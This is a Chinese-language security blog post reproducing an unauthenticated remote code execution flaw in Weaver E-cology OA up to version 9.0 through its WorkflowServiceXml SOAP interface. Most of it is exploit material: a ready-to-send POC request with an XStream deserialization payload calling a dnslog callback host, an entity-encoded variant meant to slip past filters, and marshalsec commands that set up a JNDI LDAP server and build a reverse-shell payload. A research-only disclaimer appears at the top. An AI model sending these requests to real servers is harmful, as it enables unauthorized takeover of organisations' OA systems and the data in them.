***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

![v2-edb55e13147dd995539b9d7b5abc0831_b.jpg](https://image.3001.net/images/20210516/1621169669_60a116051b867029a9146.jpg!small)

## ‍一、漏洞描述

泛微E-cology
OA系统的WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程代码执行。

## ‍二、漏洞影响

E-cology <= 9.0

## ‍三、漏洞复现‍‍

访问主页：

![v2-6ebd040858c015c463c12b4c2e285fbe_b.jpg](https://image.3001.net/images/20210516/1621169669_60a116057b32a72dd9978.jpg!small)

POC：

    
    
    POST /services%20/WorkflowServiceXml HTTP/1.1 Accept-Encoding: gzip, deflate Content-Type: text/xml;charset=UTF-8 SOAPAction: "" Content-Length: 10994 Host: xxx User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: close <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn"> <soapenv:Header/> <soapenv:Body> <web:doCreateWorkflowRequest> . <web:string> <map> <entry> <url>http://thelostworld.dnslog.cn</url> <string>http://thelostworld.dnslog.cn</string> </entry> </map> </web:string> <web:string>2</web:string> . </web:doCreateWorkflowRequest> </soapenv:Body> </soapenv:Envelope>

编码：

![v2-2030b65ca537c5f28cb95f27f7c57c0d_b.jpg](https://image.3001.net/images/20210516/1621169669_60a11605d94b3c7c47790.jpg!small)

    
    
    POST /services%20/WorkflowServiceXml HTTP/1.1 Accept-Encoding: gzip, deflate Content-Type: text/xml;charset=UTF-8 SOAPAction: "" Content-Length: 10994 Host: xxx User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: close <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn"> <soapenv:Header/> <soapenv:Body> . <web:doCreateWorkflowRequest> <web:string> &amplt&#109;&#97;&#112;&ampgt&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&amplt&#101;&#110;&#116;&#114;&#121;&ampgt&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&amplt&#117;&#114;&#108;&ampgt&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#116;&#104;&#101;&#108;&#111;&#115;&#116;&#119;&#111;&#114;&#108;&#100;&#46;&#100;&#110;&#115;&#108;&#111;&#103;&#46;&#99;&#110;&amplt&#47;&#117;&#114;&#108;&ampgt&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&amplt&#115;&#116;&#114;&#105;&#110;&#103;&ampgt&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#116;&#104;&#101;&#108;&#111;&#115;&#116;&#119;&#111;&#114;&#108;&#100;&#46;&#100;&#110;&#115;&#108;&#111;&#103;&#46;&#99;&#110;&amplt&#47;&#115;&#116;&#114;&#105;&#110;&#103;&ampgt&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&amplt&#47;&#101;&#110;&#116;&#114;&#121;&ampgt&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&amplt&#47;&#109;&#97;&#112;&ampgt </web:string> . <web:string>2</web:string> </web:doCreateWorkflowRequest> </soapenv:Body> </soapenv:Envelope>

或者直接：

利用 marshalsec 生成反弹shell payload

启动 jndi ：ldap服务

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/#Exploit

生存poc：

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream CommonsBeanutils ldap://127.0.0.1:1389/Exploit > payload.xml

DNSlog：

![v2-423980ddb389c78b0b8af2cd9596b0e7_b.jpg](https://image.3001.net/images/20210516/1621169670_60a116063c0a2183bdb4d.jpg!small)

执行命令![v2-422d4c815e92a450bf9ddeaf42c144a0_b.jpg](https://image.3001.net/images/20210516/1621169670_60a116068f8bc7db169be.jpg!small)

参考：

https://mp.weixin.qq.com/s/-eTSGvjuygGxULHcw6lOMg

http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology%20WorkflowServiceXml%20RCE.html?h=%E6%B3%9B%E5%BE%AEE-Cology%20WorkflowServiceXml%20RCE

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

如果本文内容侵权或者对贵公司业务或者其他有影响，请联系作者删除。

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![v2-ecdfe0b7f2dd19a1c854653de344b092_b.jpg](https://image.3001.net/images/20210516/1621169670_60a11606e47e00260923c.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![v2-4b029825345899d23992b40ada6b2840_b.jpg](https://image.3001.net/images/20210516/1621169671_60a11607395d6913ae5d7.jpg!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”![v2-0d302ca3ab5381e8c1ab1065bf16271a_b.jpg](https://image.3001.net/images/20210516/1621169671_60a11607845c4455a8d5f.jpg!small)

